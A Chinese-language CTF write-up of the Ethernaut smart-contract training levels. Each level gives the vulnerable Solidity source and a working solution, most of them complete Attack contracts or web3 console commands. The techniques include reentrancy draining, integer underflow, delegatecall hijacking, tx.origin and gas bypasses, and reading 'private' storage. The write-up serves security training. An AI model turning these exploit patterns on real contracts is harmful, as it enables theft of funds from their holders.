@@ -1,0 +1,1316 @@
+# Zeppelin Ethernaut writeup
+
+阅读量 **293757**
+
+|评论 **2**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2018-06-22 14:57:43
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p0.ssl.qhimg.com/t01ca6a8ded91126020.png)
+
+Ethernaut 是 Zeppelin 提供的一个基于 Web3 和 Solidity 的智能合约审计训练平台，目前收录了 15
+道题目，复现了智能合约中可能出现的各种安全问题。  
+<https://ethernaut.zeppelin.solutions>
+
+## 0\. Hello Ethernaut
+
+签到关，同时也是新手教程。  
+首先要装 MetaMask 浏览器插件，切换到 Ropsten test network，创建账号，点击
+BUY，给自己打点钱先。由于是测试网络，所以随便白嫖。  
+打开 console，跟着教程试几个命令，确认无误后就可以愉快的做题了。
+
+第一关主要是熟悉操作，跟着提示调用函数即可。
+
+    
+    
+    contract.info()
+    // "You will find what you need in info1()."
+    contract.info1()
+    // "Try info2(), but with "hello" as a parameter."
+    contract.info2('hello')
+    // "The property infoNum holds the number of the next info method to call."
+    contract.infoNum()
+    // 42
+    contract.info42()
+    // "theMethodName is the name of the next method."
+    contract.theMethodName()
+    // "The method name is method7123949."
+    contract.method7123949()
+    // "If you know the password, submit it to authenticate()."
+    contract.password()
+    // "ethernaut0"
+    contract.authenticate('ethernaut0')
+    // done
+    
+
+提交答案后可以看到源码。
+
+## 1\. Fallback
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
+    
+    contract Fallback is Ownable {
+    
+      mapping(address => uint) public contributions;
+    
+      function Fallback() public {
+        contributions[msg.sender] = 1000 * (1 ether);
+      }
+    
+      function contribute() public payable {
+        require(msg.value < 0.001 ether);
+        contributions[msg.sender] += msg.value;
+        if(contributions[msg.sender] > contributions[owner]) {
+          owner = msg.sender;
+        }
+      }
+    
+      function getContribution() public view returns (uint) {
+        return contributions[msg.sender];
+      }
+    
+      function withdraw() public onlyOwner {
+        owner.transfer(this.balance);
+      }
+    
+      function() payable public {
+        require(msg.value > 0 && contributions[msg.sender] > 0);
+        owner = msg.sender;
+      }
+    }
+    
+
+通关条件
+
+  * 成为合约的 owner
+  * 清零 balance
+
+合约构造函数 `Fallback()` 中初始化拥有者贡献度为 1000 ether。  
+我们可以通过转钱提升贡献度，当贡献度超过 1000 ether 即可成为合约 owner。  
+但在 `contribute()` 中限制了每次只能转小于 0.001 ether 的钱。很明显，此路不通。
+
+然而成为 owner 还有另一种方式，注意到合约的 fallback 函数，即最下的无名函数。当合约账户收到一笔转账时会自动调用 fallback
+函数。在这里，只要转账金额大于0，并且贡献大于0，即可成为 owner。
+
+调用 `help()` 函数，了解下如何进行转钱操作。还需要注意一下 Wei 和 Ether 的转换。
+
+    
+    
+    contract.contribute({value: 1})
+    contract.sendTransaction({value: 1})
+    contract.withdraw()
+    
+
+## 2\. Fallout
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
+    
+    contract Fallout is Ownable {
+    
+      mapping (address => uint) allocations;
+    
+      /* constructor */
+      function Fal1out() public payable {
+        owner = msg.sender;
+        allocations[owner] = msg.value;
+      }
+    
+      function allocate() public payable {
+        allocations[msg.sender] += msg.value;
+      }
+    
+      function sendAllocation(address allocator) public {
+        require(allocations[allocator] > 0);
+        allocator.transfer(allocations[allocator]);
+      }
+    
+      function collectAllocations() public onlyOwner {
+        msg.sender.transfer(this.balance);
+      }
+    
+      function allocatorBalance(address allocator) public view returns (uint) {
+        return allocations[allocator];
+      }
+    }
+    
+
+通关条件
+
+  * 成为合约的 owner
+
+一个很简单的合约，其中改变 owner 的只有 `Fal1out()` 函数，但这是个构造函数，要怎么调用呢。  
+想了好久好久… 然后发现这根本不是构造函数，其中一个是 `l` 和 `1`，长得太像了…  
+无良出题人甚至还给了个注释来强调一下这个假构造函数的身份，太过分了。  
+所以直接转钱调用就好了。
+
+    
+    
+    contract.Fal1out({value: 1})
+    
+
+## 3\. Coin Flip
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    contract CoinFlip {
+      uint256 public consecutiveWins;
+      uint256 lastHash;
+      uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    
+      function CoinFlip() public {
+        consecutiveWins = 0;
+      }
+    
+      function flip(bool _guess) public returns (bool) {
+        uint256 blockValue = uint256(block.blockhash(block.number-1));
+    
+        if (lastHash == blockValue) {
+          revert();
+        }
+    
+        lastHash = blockValue;
+        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
+        bool side = coinFlip == 1 ? true : false;
+    
+        if (side == _guess) {
+          consecutiveWins++;
+          return true;
+        } else {
+          consecutiveWins = 0;
+          return false;
+        }
+      }
+    }
+    
+
+通关条件
+
+  * 连续猜对 10 次
+
+`FACTOR` 为 2^255，`coinFlip` 结果只会为 1 或 0  
+相当于一个猜硬币正反面的游戏
+
+这是经典的区块链伪随机数的问题。  
+在以太坊智能合约中编写的基于随机数的处理逻辑是十分危险的，因为区块链上的数据是公开的，所有人都可以看见，利用公开的数据来生成随机数是不明智的。  
+此外，像 `timestamps` 这样矿工可控的数据也不宜作为种子。
+
+在这道题中，出题人利用 `block.blockhash(block.number-1)`
+来生成随机数，这是可预测的。我们可以部署一个新的合约，先进行随机数的预测，再进行竞猜。  
+部署合约： <http://remix.ethereum.org>
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    contract CoinFlip {
+      uint256 public consecutiveWins;
+      uint256 lastHash;
+      uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    
+      function CoinFlip() public {
+        consecutiveWins = 0;
+      }
+    
+      function flip(bool _guess) public returns (bool) {
+        uint256 blockValue = uint256(block.blockhash(block.number-1));
+    
+        if (lastHash == blockValue) {
+          revert();
+        }
+    
+        lastHash = blockValue;
+        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
+        bool side = coinFlip == 1 ? true : false;
+    
+        if (side == _guess) {
+          consecutiveWins++;
+          return true;
+        } else {
+          consecutiveWins = 0;
+          return false;
+        }
+      }
+    }
+    
+    contract Attack {
+      CoinFlip fliphack;
+      address instance_address = instance_address_here;
+      uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    
+      function Attack() {
+        fliphack = CoinFlip(instance_address);
+      }
+    
+      function predict() public view returns (bool){
+        uint256 blockValue = uint256(block.blockhash(block.number-1));
+        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
+        return coinFlip == 1 ? true : false;
+      }
+    
+      function hack() public {
+        bool guess = predict();
+        fliphack.flip(guess);
+      }
+    }
+    
+
+只需调用 10 次 `hack()` 函数即可。
+
+## 4\. Telephone
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    contract Telephone {
+    
+      address public owner;
+    
+      function Telephone() public {
+        owner = msg.sender;
+      }
+    
+      function changeOwner(address _owner) public {
+        if (tx.origin != msg.sender) {
+          owner = _owner;
+        }
+      }
+    }
+    
+
+通关条件
+
+  * 成为合约的 owner
+
+代码很短，这里的考点是 `tx.origin` 和 `msg.sender` 的区别。
+
+  * `tx.origin` 是交易的发送方。
+  * `msg.sender` 是消息的发送方。
+
+用户通过另一个合约 Attack 来调用目标合约中的 `changeOwner()`  
+此时，`tx.origin` 为 用户，`msg.sender` 为 Attack，即可绕过条件，成为 owner
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    contract Telephone {
+    
+      address public owner;
+    
+      function Telephone() public {
+        owner = msg.sender;
+      }
+    
+      function changeOwner(address _owner) public {
+        if (tx.origin != msg.sender) {
+          owner = _owner;
+        }
+      }
+    }
+    
+    contract Attack {
+        address instance_address = instance_address_here;
+        Telephone target = Telephone(instance_address);
+    
+        function hack() public {
+            target.changeOwner(msg.sender);
+        }
+    }
+    
+
+部署合约，调用 `hack()` 函数即可。
+
+## 5\. Token
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    contract Token {
+    
+      mapping(address => uint) balances;
+      uint public totalSupply;
+    
+      function Token(uint _initialSupply) public {
+        balances[msg.sender] = totalSupply = _initialSupply;
+      }
+    
+      function transfer(address _to, uint _value) public returns (bool) {
+        require(balances[msg.sender] - _value >= 0);
+        balances[msg.sender] -= _value;
+        balances[_to] += _value;
+        return true;
+      }
+    
+      function balanceOf(address _owner) public view returns (uint balance) {
+        return balances[_owner];
+      }
+    }
+    
+
+经典的整数溢出问题  
+在 `transfer()` 函数第一行 `require` 里，这里的 `balances` 和 `value` 都是 uint。此时
+`balances` 为 20，令 `value` = 21，产生下溢，从而绕过验证，并转出一笔很大的金额。
+
+    
+    
+    contract.transfer(player_address, 21)
+    
+
+为了防止整数溢出，应该使用 `require(balances[msg.sender] >= _value)`  
+或是使用 OpenZeppelin 维护的 SafeMath 库来处理算术逻辑。
+
+## 6\. Delegation
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    contract Delegate {
+    
+      address public owner;
+    
+      function Delegate(address _owner) public {
+        owner = _owner;
+      }
+    
+      function pwn() public {
+        owner = msg.sender;
+      }
+    }
+    
+    contract Delegation {
+    
+      address public owner;
+      Delegate delegate;
+    
+      function Delegation(address _delegateAddress) public {
+        delegate = Delegate(_delegateAddress);
+        owner = msg.sender;
+      }
+    
+      function() public {
+        if(delegate.delegatecall(msg.data)) {
+          this;
+        }
+      }
+    }
+    
+
+考点在于 Solidity 中支持两种底层调用方式 `call` 和 `delegatecall`
+
+  * `call` 外部调用时，上下文是外部合约
+  * `delegatecall` 外部调用时，上下文是调用合约
+
+![](https://p5.ssl.qhimg.com/t0178fe0b2bf3b4bd50.png)
+
+在本题中，`Delegation` 合约中的 `delegatecall` 函数参数可控，导致可以在合约内部执行任意函数，只需调用 `Delegate`
+合约中的 `pwn` 函数，即可将 owner 变成自己。
+
+    
+    
+    contract.sendTransaction({data: web3.sha3("pwn()").slice(0,10)});
+    
+
+## 7\. Force
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    contract Force {/*
+    
+                       MEOW ?
+             /_/   /
+        ____/ o o 
+      /~____  =ø= /
+     (______)__m_m)
+    
+    */}
+    
+
+刚看到这个合约是一脸懵逼的。
+
+回头看了下题目要求：使合约 balance 大于 0  
+然而这个空合约并没有任何地方可以收钱
+
+这里用到智能合约的一个 trick，当一个合约调用 `selfdestruct` 函数，也就是自毁时，可以将所有存款发给另一个合约，并且强制对方收下。  
+所有只需要再部署一个合约，打一点钱，然后自毁，把剩余金额留给目标合约。
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    contract Attack {
+        address instance_address = instance_address_here;
+    
+        function Attack() payable{}
+        function hack() public {
+            selfdestruct(instance_address);
+        }
+    }
+    
+
+调用 `hack()`函数，然后当场去世。
+
+![](https://p2.ssl.qhimg.com/t01866a8414c7bc5c15.jpg)
+
+可以看到，Attack 合约在自毁的时候，将余额 1 wei 转给了 Force 合约。
+
+## 8\. Vault
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    contract Vault {
+      bool public locked;
+      bytes32 private password;
+    
+      function Vault(bytes32 _password) public {
+        locked = true;
+        password = _password;
+      }
+    
+      function unlock(bytes32 _password) public {
+        if (password == _password) {
+          locked = false;
+        }
+      }
+    }
+    
+
+通关条件
+
+  * 使 `locked = false`
+
+合约逻辑很简单，需要知道 `password` 来解锁合约，而 `password` 属性设置了 `private`，无法被其他合约直接访问。
+
+解决该问题的关键点在于，这是一个部署在区块链上的智能合约，而区块链上的所有信息都是公开的。
+
+可以用 `getStorageAt` 函数来访问合约里变量的值。合约里一共两个变量，`password` 第二个声明，position 为
+1。翻一下文档，`getStorageAt` 函数需要带上回调函数，可以选择直接把返回结果 alert 出来。
+
+    
+    
+    web3.eth.getStorageAt(contract.address, 1, function(x, y) {alert(web3.toAscii(y))});
+    // A very strong secret password :)
+    contract.unlock('A very strong secret password :)')
+    
+
+提交之后能看到，Zeppelin 给出的建议是：为确保数据私密，在将数据放入区块链之前需要对其进行加密，并且解密密钥不应该在链上发送。
+
+## 9\. King
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
+    
+    contract King is Ownable {
+    
+      address public king;
+      uint public prize;
+    
+      function King() public payable {
+        king = msg.sender;
+        prize = msg.value;
+      }
+    
+      function() external payable {
+        require(msg.value >= prize || msg.sender == owner);
+        king.transfer(msg.value);
+        king = msg.sender;
+        prize = msg.value;
+      }
+    }
+    
+
+合约代码逻辑很简单，谁给的钱多谁就能成为 King，并且将前任 King 付的钱归还。当提交 instance 时，题目会重新夺回 King
+的位置，需要解题者阻止其他人成为 King。
+
+首先需要讨论一下 Solidity 中几种转币方式。
+
+`<address>.transfer()`
+
+  * 当发送失败时会 `throw;` 回滚状态
+  * 只会传递部分 Gas 供调用，防止重入（reentrancy）
+
+`<address>.send()`
+
+  * 当发送失败时会返回 false
+  * 只会传递部分 Gas 供调用，防止重入（reentrancy）
+
+`<address>.call.value()()`
+
+  * 当发送失败时会返回 false
+  * 传递所有可用 Gas 供调用，不能有效防止重入（reentrancy）
+
+回头再看一下代码，当我们成为 King 之后，如果有人出价比我们高，会首先把钱退回给我们，使用的是 `transfer()`。上面提到，当
+`transfer()` 调用失败时会回滚状态，那么如果合约在退钱这一步骤一直调用失败的话，代码将无法继续向下运行，其他人就无法成为新的 King。
+
+首先查看一下当前最高出价
+
+    
+    
+    fromWei((await contract.prize()).toNumber())
+    // 1 eth
+    
+
+部署一个新的合约，当收到转账时主动抛出错误。
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    contract Attack {
+        address instance_address = instance_address_here;
+    
+        function Attack() payable{}
+    
+        function hack() public {
+            instance_address.call.value(1.1 ether)();
+        }
+    
+        function () public {
+            revert();
+        }
+    }
+    
+
+调用 `hack()`， 成为新的 King
+
+![](https://oyaf7gkg5.bkt.clouddn.com/king1.jpg)
+
+Submit instance 之后，仍然是 King
+
+![](https://p3.ssl.qhimg.com/t0176f42f99e4c74394.jpg)
+
+## 10\. Re-entrancy
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    contract Reentrance {
+    
+      mapping(address => uint) public balances;
+    
+      function donate(address _to) public payable {
+        balances[_to] += msg.value;
+      }
+    
+      function balanceOf(address _who) public view returns (uint balance) {
+        return balances[_who];
+      }
+    
+      function withdraw(uint _amount) public {
+        if(balances[msg.sender] >= _amount) {
+          if(msg.sender.call.value(_amount)()) {
+            _amount;
+          }
+          balances[msg.sender] -= _amount;
+        }
+      }
+    
+      function() public payable {}
+    }
+    
+
+DASP 排第一的重入漏洞，也是之前比较著名的 DAO 事件里使用到的方法
+
+漏洞主要在于 `withdraw()` 函数，合约在进行提币时，使用 require 依次判断提币账户是否拥有相应的资产，随后使用
+`msg.sender.call.value(amount)()` 来发送 Ether，处理完成后相应修改用户资产数据。
+
+在提币的过程中，存在一个递归 withdraw 的问题（因为资产修改在转币之后），攻击者可以部署一个包含恶意递归调用的合约将公共钱包合约里的 Ether
+全部提出。
+
+![](https://p4.ssl.qhimg.com/t01755d9991a552c3d4.png)
+
+再复习一下 Solidity 中几种转币方式。
+
+`<address>.transfer()`
+
+  * 当发送失败时会 `throw;` 回滚状态
+  * 只会传递部分 Gas 供调用，防止重入（reentrancy）
+
+`<address>.send()`
+
+  * 当发送失败时会返回 false
+  * 只会传递部分 Gas 供调用，防止重入（reentrancy）
+
+`<address>.call.value()()`
+
+  * 当发送失败时会返回 false
+  * 传递所有可用 Gas 供调用，不能有效防止重入（reentrancy）
+
+使用 `msg.sender.call.value(amount)()` 传递了所有可用 Gas 供调用，也是可以成功执行递归的前提条件。
+
+查看题目合约地址信息，可以看到在初始化时转入了 1 ether，我们需要把目标合约的余额提出到自己的合约上。
+
+部署合约
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    contract Reentrance {
+    
+      mapping(address => uint) public balances;
+    
+      function donate(address _to) public payable {
+        balances[_to] += msg.value;
+      }
+    
+      function balanceOf(address _who) public view returns (uint balance) {
+        return balances[_who];
+      }
+    
+      function withdraw(uint _amount) public {
+        if(balances[msg.sender] >= _amount) {
+          if(msg.sender.call.value(_amount)()) {
+            _amount;
+          }
+          balances[msg.sender] -= _amount;
+        }
+      }
+    
+      function() public payable {}
+    }
+    
+    contract Attack {
+    
+        address instance_address = instance_address_here;
+        Reentrance target = Reentrance(instance_address);
+    
+        function Attack() payable{}
+    
+        function donate() public payable {
+            target.donate.value(msg.value)(this);
+        }
+    
+        function hack() public {
+            target.withdraw(0.5 ether);
+        }
+    
+        function get_balance() public view returns(uint) {
+            return target.balanceOf(this);
+        }
+    
+        function my_eth_bal() public view returns(uint) {
+            return address(this).balance;
+        }
+    
+        function ins_eth_bal() public view returns(uint) {
+            return instance_address.balance;
+        }
+    
+        function () public payable {
+            target.withdraw(0.5 ether);
+        }
+    }
+    
+
+初始状态
+
+  * balance 为 0
+  * `Reentrance` 账户余额 1 ether
+  * `Attack` 账户余额 0 ether  
+
+调用 `donate()` 以攻击者合约的身份向题目地址转账 1 ether
+
+  * balance 为 1
+  * `Reentrance` 账户余额 2 ether
+  * `Attack` 账户余额 0 ether  
+
+调用 `hacker()` 赎回 0.5 ether，回调函数递归调用 `withdraw()`，触发重入漏洞
+
+  * balance 下溢
+  * `Reentrance` 账户余额 0 ether
+  * `Attack` 账户余额 2 ether  
+
+成功将题目账户中本不属于我们 1 ether 也提出。
+
+出题人给出的建议是，使用较为安全的 `transfer()` 来进行转币操作。
+
+## 11\. Elevator
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    interface Building {
+      function isLastFloor(uint) view public returns (bool);
+    }
+    
+    contract Elevator {
+      bool public top;
+      uint public floor;
+    
+      function goTo(uint _floor) public {
+        Building building = Building(msg.sender);
+    
+        if (! building.isLastFloor(_floor)) {
+          floor = _floor;
+          top = building.isLastFloor(floor);
+        }
+      }
+    }
+    
+
+通关条件
+
+  * 使 `contract.top` 为 `true`
+
+`Building` 接口中声明了 `isLastFloor` 函数，用户可以自行编写。
+
+在主合约中，先调用 `building.isLastFloor(_floor)` 进行 if 判断，然后将
+`building.isLastFloor(_floor)` 赋值给 `top` 。要使 `top = true`，则
+`building.isLastFloor(_floor)` 第一次调用需返回 `false`，第二次调用返回 `true`。
+
+思路也很简单，设置一个初始值为 `true` 的变量，每次调用 `isLastFloor()` 函数时，将其取反再返回。
+
+不过，题目中在声明 `isLastFloor` 函数时，赋予了其 `view` 属性，`view` 表示函数会读取合约变量，但是不会修改任何合约的状态。
+
+回头看了下题目给的提示
+
+  * Sometimes solidity is not good at keeping promises.
+  * This Elevator expects to be used from a Building.
+
+翻了下文档，找到了对 `view` 的描述：
+
+> view functions: The compiler does not enforce yet that a view method is not
+> modifying state.
+
+函数在保证不修改状态情况下可以被声明为视图（view）的形式。但这是松散的，当前 Solidity 编译器没有强制执行视图函数（view
+function）不能修改状态。
+
+那么上述做法就是可行的了。部署合约：
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    interface Building {
+      function isLastFloor(uint) view public returns (bool);
+    }
+    
+    contract Elevator {
+      bool public top;
+      uint public floor;
+    
+      function goTo(uint _floor) public {
+        Building building = Building(msg.sender);
+    
+        if (! building.isLastFloor(_floor)) {
+          floor = _floor;
+          top = building.isLastFloor(floor);
+        }
+      }
+    }
+    
+    contract Attack {
+    
+        address instance_address = instance_address_here;
+        Elevator target = Elevator(instance_address);
+        bool public isLast = true;
+    
+        function isLastFloor(uint) public returns (bool) {
+            isLast = ! isLast;
+            return isLast;
+        }
+    
+        function hack() public {
+            target.goTo(1024);
+        }
+    
+    }
+    
+
+调用 `hack()` 函数，成功将 `contract.top` 修改为 `true`
+
+![](https://p4.ssl.qhimg.com/t01c91073ad689c95fb.jpg)
+
+## 12\. Privacy
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    contract Privacy {
+    
+      bool public locked = true;
+      uint256 public constant ID = block.timestamp;
+      uint8 private flattening = 10;
+      uint8 private denomination = 255;
+      uint16 private awkwardness = uint16(now);
+      bytes32[3] private data;
+    
+      function Privacy(bytes32[3] _data) public {
+        data = _data;
+      }
+    
+      function unlock(bytes16 _key) public {
+        require(_key == bytes16(data[2]));
+        locked = false;
+      }
+    
+      /*
+        A bunch of super advanced solidity algorithms...
+    
+          ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
+          .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
+          *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V
+          `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
+          ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
+      */
+    }
+    
+
+之前 `Vault` 题目的升级版。还是一样，用 `getStorageAt()` 把链上的数据读出来先。
+
+    
+    
+    web3.eth.getStorageAt(contract.address, 0, function(x, y) {alert(y)});
+    web3.eth.getStorageAt(contract.address, 1, function(x, y) {alert(y)});
+    web3.eth.getStorageAt(contract.address, 2, function(x, y) {alert(y)});
+    web3.eth.getStorageAt(contract.address, 3, function(x, y) {alert(y)});
+    web3.eth.getStorageAt(contract.address, 4, function(x, y) {alert(y)});
+    
+    // 0x00000000000000000000000000000000000000000000000000000086b2ff0a01
+    // 0x6be9a25967a00434c9634d02b673c5bb4a14ad1fe8f1439e41f7f926dc3a884a
+    // 0xcf1e2bfa2471a6cfa8edd2cab4140248f94ca74b87691f129444677be4bd9c88
+    // 0x06b3b79c6b707e890d7160ed7a1c16df8a16704fdd0bafcbc08e3094ab05dd40
+    // 0x0000000000000000000000000000000000000000000000000000000000000000
+    
+
+可以看到，每一个存储位是 32 个字节。根据 Solidity 优化规则，当变量所占空间小于 32
+字节时，会与后面的变量共享空间，如果加上后面的变量也不超过 32 字节的话。  
+除去 `ID` 常量无需存储
+
+  * `bool public locked = true` 占 1 字节 -> `01`
+  * `uint8 private flattening = 10` 占 1 字节 -> `0a`
+  * `uint8 private denomination = 255` 占 1 字节 -> `ff`
+  * `uint16 private awkwardness = uint16(now)` 占 2 字节 -> `86b2`
+
+刚好对应了第一个存储位的 `86b2ff0a01`
+
+解题需要的 `data[2]` 则应该在第四存储位
+`0x06b3b79c6b707e890d7160ed7a1c16df8a16704fdd0bafcbc08e3094ab05dd40`
+
+注意到这里有一个 `bytes32` 转换为 `bytes16`，在 Remix-ide 上做一个简单测试。
+
+![](https://p5.ssl.qhimg.com/dm/1024_195_/t0115e5a51cd829bd06.jpg)
+
+所以只需要取前 16 字节即可
+
+![](https://p5.ssl.qhimg.com/t0132833ca5339d51a2.jpg)
+
+## 13\. Gatekeeper One
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    contract GatekeeperOne {
+    
+      address public entrant;
+    
+      modifier gateOne() {
+        require(msg.sender != tx.origin);
+        _;
+      }
+    
+      modifier gateTwo() {
+        require(msg.gas % 8191 == 0);
+        _;
+      }
+    
+      modifier gateThree(bytes8 _gateKey) {
+        require(uint32(_gateKey) == uint16(_gateKey));
+        require(uint32(_gateKey) != uint64(_gateKey));
+        require(uint32(_gateKey) == uint16(tx.origin));
+        _;
+      }
+    
+      function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+        entrant = tx.origin;
+        return true;
+      }
+    }
+    
+
+需要满足 3 个 modifier 的条件。
+
+`gateOne()` 利用之前做过的 Telephone 的知识，从第三方合约来调用 `enter()` 即可满足条件。
+
+`gateTwo()` 需要满足 `msg.gas % 8191 == 0`  
+`msg.gas` 文档里的描述是 `remaining gas`，在 Javascript VM 环境下进行 Debug，在 Step detail
+栏中可以看到这个变量。
+
+![](https://p5.ssl.qhimg.com/dm/1024_328_/t0130c8f59488134df9.jpg)
+
+同时，在调用 `enter()` 函数的时候，可以选择更加底层的 `call` 来更方便控制传递的 gas 数量。通过 debug 找到一个符合要求的
+gas 数量 41170。
+
+`gateThree()` 也比较简单，将 `tx.origin` 倒数三四字节换成 0000 即可。  
+`bytes8(tx.origin) & 0xFFFFFFFF0000FFFF` 即可满足条件。
+
+部署合约
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    contract GatekeeperOne {
+    
+      address public entrant;
+    
+      modifier gateOne() {
+        require(msg.sender != tx.origin);
+        _;
+      }
+    
+      modifier gateTwo() {
+        require(msg.gas % 8191 == 0);
+        _;
+      }
+    
+      modifier gateThree(bytes8 _gateKey) {
+        require(uint32(_gateKey) == uint16(_gateKey));
+        require(uint32(_gateKey) != uint64(_gateKey));
+        require(uint32(_gateKey) == uint16(tx.origin));
+        _;
+      }
+    
+      function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+        entrant = tx.origin;
+        return true;
+      }
+    }
+    
+    contract Attack {
+    
+        address instance_address = instance_address_here;
+        bytes8 _gateKey = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;
+    
+        GatekeeperOne target = GatekeeperOne(instance_address);
+    
+        function hack() public {
+            target.call.gas(41170)(bytes4(keccak256("enter(bytes8)")), _gateKey);
+        }
+    }
+    
+
+调用 `hack()` 函数，完成攻击。
+
+## 14\. Gatekeeper Two
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    contract GatekeeperTwo {
+    
+      address public entrant;
+    
+      modifier gateOne() {
+        require(msg.sender != tx.origin);
+        _;
+      }
+    
+      modifier gateTwo() {
+        uint x;
+        assembly { x := extcodesize(caller) }
+        require(x == 0);
+        _;
+      }
+    
+      modifier gateThree(bytes8 _gateKey) {
+        require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
+        _;
+      }
+    
+      function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+        entrant = tx.origin;
+        return true;
+      }
+    }
+    
+
+`gateOne()` 和上一题一样，用第三方合约来调用 `enter()` 即可满足条件。
+
+`gateThree()` 也比较简单，由于是个异或，可以直接算出来。  
+`_gateKey = (bytes8)(uint64(keccak256(address(this))) ^ (uint64(0) - 1))`
+
+比较有技巧性的是 `gateTwo()` ，用了内联汇编的写法。  
+翻了一下文档 <https://ethereum.github.io/yellowpaper/paper.pdf>
+
+  * `caller` : `Get caller address.`
+  * `extcodesize` : `Get size of an account’s code.`
+
+按照题目的意思，要使当前合约代码区为空，显然与解题是矛盾的。
+
+仔细读文档，注意到一些细节
+
+> Note that while the initialisation code is executing, the newly created
+> address exists but with no intrinsic body code.  
+>  ……  
+>  During initialization code execution, EXTCODESIZE on the address should
+> return zero, which is the length of the code of the account while CODESIZE
+> should return the length of the initialization code.
+
+也就是说，在执行初始化代码（构造函数），而新的区块还未添加到链上的时候，新的地址已经生成，然而代码区为空。此时，调用 `EXTCODESIZE()` 返回为
+0
+
+那么，只需要在第三方合约的构造函数中来调用题目合约中的 `enter()` 即可满足条件。
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    contract GatekeeperTwo {
+    
+      address public entrant;
+    
+      modifier gateOne() {
+        require(msg.sender != tx.origin);
+        _;
+      }
+    
+      modifier gateTwo() {
+        uint x;
+        assembly { x := extcodesize(caller) }
+        require(x == 0);
+        _;
+      }
+    
+      modifier gateThree(bytes8 _gateKey) {
+        require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
+        _;
+      }
+    
+      function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+        entrant = tx.origin;
+        return true;
+      }
+    }
+    
+    contract Attack {
+    
+        address instance_address = instance_address_here;
+        GatekeeperTwo target = GatekeeperTwo(instance_address);
+    
+        function Attack(){
+            target.enter((bytes8)(uint64(keccak256(address(this))) ^ (uint64(0) - 1)));
+        }
+    
+    }
+    
+
+部署合约，自动调用构造函数的 `target.enter()`，完成攻击。
+
+## 15\. Naught Coin
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    import 'zeppelin-solidity/contracts/token/ERC20/StandardToken.sol';
+    
+     contract NaughtCoin is StandardToken {
+    
+      string public constant name = 'NaughtCoin';
+      string public constant symbol = '0x0';
+      uint public constant decimals = 18;
+      uint public timeLock = now + 10 years;
+      uint public INITIAL_SUPPLY = 1000000 * (10 ** decimals);
+      address public player;
+    
+      function NaughtCoin(address _player) public {
+        player = _player;
+        totalSupply_ = INITIAL_SUPPLY;
+        balances[player] = INITIAL_SUPPLY;
+        Transfer(0x0, player, INITIAL_SUPPLY);
+      }
+    
+      function transfer(address _to, uint256 _value) lockTokens public returns(bool) {
+        super.transfer(_to, _value);
+      }
+    
+      // Prevent the initial owner from transferring tokens until the timelock has passed
+      modifier lockTokens() {
+        if (msg.sender == player) {
+          require(now > timeLock);
+          if (now < timeLock) {
+            _;
+          }
+        } else {
+         _;
+        }
+      } 
+    }
+    
+
+根据题意，需要将自己的 balance 清空。合约里提供了 `transfer()` 函数来进行转账操作，但注意到有一个 modifier
+`lockTokens()`，限制了只有十年后才能调用 `transfer()` 函数。需要解题者 bypass it
+
+注意到该合约是 `StandardToken` 的子合约，题目中也给出了源码库地址与 ERC20 接口规范文档  
+<https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts>  
+<https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md>
+
+在子合约中找不出更多信息的时候，把目光更多放到父合约和接口上
+
+在接口规范里能看到，除了 `transfer()` 之外，还有 `transferFrom()` 函数也可以进行转账操作。
+
+![](https://p0.ssl.qhimg.com/t01f8721e5cbab25999.jpg)
+
